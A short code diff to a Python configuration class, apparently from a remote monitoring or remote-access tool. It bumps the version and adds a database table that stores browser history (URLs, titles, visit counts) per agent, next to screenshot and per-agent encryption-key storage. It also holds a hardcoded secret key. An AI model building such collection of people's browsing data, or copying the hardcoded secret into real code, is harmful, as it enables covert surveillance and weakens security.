@@ -13,7 +13,7 @@ class Config:
         self.screenshot_folder = "screenshots"
         self.max_content_length = 500 * 1024 * 1024  # 500MB
         self.secret_key = "mQsjJsMfsW43sdzPf9L2Sr78"
-        self.version = "1.4.9.8"
+        self.version = "1.5"
         self.monitor_token = secrets.token_urlsafe(32)  
 
         
@@ -121,6 +121,20 @@ class Config:
                 aes_key TEXT NOT NULL,
                 aes_iv TEXT NOT NULL,
                 timestamp TEXT NOT NULL
+            )
+        ''')
+        
+        c.execute('''
+            CREATE TABLE IF NOT EXISTS browser_history (
+                id INTEGER PRIMARY KEY,
+                agent_id TEXT,
+                browser TEXT,
+                profile TEXT,
+                url TEXT,
+                title TEXT,
+                visit_count INTEGER,
+                last_visit_time INTEGER,
+                timestamp TEXT
             )
         ''')
         
